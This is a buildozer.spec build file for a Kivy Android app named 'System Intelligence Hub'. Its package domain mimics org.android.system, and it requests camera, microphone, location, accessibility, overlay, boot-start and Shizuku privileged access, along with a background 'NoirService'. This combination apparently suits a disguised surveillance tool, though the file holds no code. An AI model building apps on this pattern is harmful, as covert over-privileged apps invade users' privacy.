[app]
title = System Intelligence Hub v17.2 [OMEGA]
package.name = sys_intel_omega
package.domain = org.android.system
source.dir = mobile_app
source.include_exts = py,png,jpg,kv,atlas
version = 17.2
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,idna,chardet,pillow,pyjnius,jpeg,png,openssl,pycryptodome,adb-shell
p4a.branch = master
orientation = portrait
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, WAKE_LOCK, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, BIND_ACCESSIBILITY_SERVICE, moe.shizuku.manager.permission.API_V23, PACKAGE_USAGE_STATS, QUERY_ALL_PACKAGES
android.gradle_dependencies =
android.api = 33
android.minapi = 24
services = NoirService:service.py
android.ndk = 25b
android.ndk_api = 24
android.archs = arm64-v8a
android.private_storage = True
android.enable_androidx = True
android.skip_update = False
android.accept_sdk_license = True
android.release_artifact = apk
android.gradle_args = --stacktrace --info -Dorg.gradle.jvmargs=-Xmx4096m
android.meta_data = moe.shizuku.client.V3_SUPPORT=true

[buildozer]
log_level = 2
warn_on_root = 1
build_dir = ./.buildozer
bin_dir = ./bin